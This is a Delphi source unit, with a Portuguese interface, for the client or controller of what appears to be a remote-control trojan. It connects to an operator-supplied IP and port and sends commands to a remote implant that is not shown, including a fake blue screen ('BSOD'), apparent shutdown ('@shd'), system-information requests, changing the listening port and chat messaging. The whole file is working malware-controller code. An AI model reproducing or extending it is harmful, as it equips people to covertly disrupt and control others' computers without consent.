unit cliente;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ScktComp, ComCtrls;

type
  TForm1 = class(TForm)
    cs: TClientSocket;
    Button2: TButton;
    Label1: TLabel;
    Edit2: TEdit;
    stb: TStatusBar;
    GroupBox1: TGroupBox;
    Memo1: TMemo;
    Button1: TButton;
    Edit1: TEdit;
    GroupBox2: TGroupBox;
    Memo2: TMemo;
    Button3: TButton;
    Button4: TButton;
    Button5: TButton;
    GroupBox3: TGroupBox;
    Edit3: TEdit;
    Button6: TButton;
    GroupBox4: TGroupBox;
    edit4: TEdit;
    Button7: TButton;
    Label2: TLabel;
    Button8: TButton;
    ComboBox1: TComboBox;
    procedure Button2Click(Sender: TObject);
    procedure csConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure csDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button1Click(Sender: TObject);
    procedure csRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;


var
  Form1: TForm1;



implementation

{$R *.DFM}
uses messenger;


procedure TForm1.Button2Click(Sender: TObject);
begin
     if cs.active then
        begin
             cs.Close;
             button2.Caption:='conecta';
        end
     else
         begin
              if edit2.Text<>'' then
                 begin
                      cs.Address:=edit2.Text;
                      cs.Port:=strtoint(combobox1.Text);
                      cs.Active:=true;
                      button2.Caption:='desconectar';
                 end
              else
                  messagedlg('Tem que informar o IP',mterror,[mbok],0);
         end;

end;

procedure TForm1.csConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
     stb.Panels.Items[0].Text:='Conectado em '+socket.RemoteAddress;
end;

procedure TForm1.csDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
     stb.Panels.Items[0].Text:='Desconectado';
     button2.Caption:='Conecta';
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
     memo1.Lines.Append(edit1.Text);
     cs.Socket.SendText(edit1.text);
     edit1.text:='';
     stb.Panels.Items[0].Text:='mensagem enviada';
end;

procedure TForm1.csRead(Sender: TObject; Socket: TCustomWinSocket);
var
   lower,text:string;
begin
     text:=socket.ReceiveText;
     if text[1]='@' then
        begin
             lower:=lowercase(text);
             stb.Panels.Items[0].Text:=lower;
        end
     else
         memo2.Lines.Append(text);
end;

procedure TForm1.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
     if key=#13 then
        button1.Click;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
     mensagens.show;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
     cs.Socket.SendText('@hab');
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
     if button5.Caption='BSOD' then
        begin
             cs.Socket.SendText('@bsd');
             button5.Caption:='BSOD off';
        end
     else
         begin
              cs.Socket.SendText('@bso');
              button5.Caption:='BSOD';
         end;
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
     cs.Socket.SendText('@prt {'+edit3.text+'}');
     combobox1.Items.Append(edit3.text);
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
     cs.Socket.SendText('@mlr {'+edit4.text+'}');
end;

procedure TForm1.FormActivate(Sender: TObject);
begin
     combobox1.Text:=combobox1.Items.Strings[0];
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
     cs.Socket.SendText('@inf');
     stb.Panels.Items[0].Text:='Informações requisitadas ao servidor';
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
     cs.Socket.SendText('@shd');
end;

end.
